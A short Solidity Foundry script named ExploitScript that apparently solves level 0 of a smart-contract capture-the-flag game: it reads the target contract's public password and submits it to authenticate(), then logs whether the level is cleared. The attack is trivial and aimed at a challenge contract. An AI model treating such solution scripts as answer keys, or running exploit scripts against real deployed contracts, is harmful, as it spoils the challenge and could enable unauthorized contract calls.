// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Script.sol";

interface Instance {
    function authenticate(string memory passkey) external;
    function password() external view returns (string memory);
    function getCleared() external view returns (bool);
}

contract ExploitScript is Script {
    
    Instance level0 = Instance(0x044dD753634CaAa34c6F051D5A245e82bB65E4Fd);

    function run() public {
        vm.startBroadcast();

        level0.password();
        level0.authenticate(level0.password());
        console.log(level0.getCleared());
        
        vm.stopBroadcast();
    }
}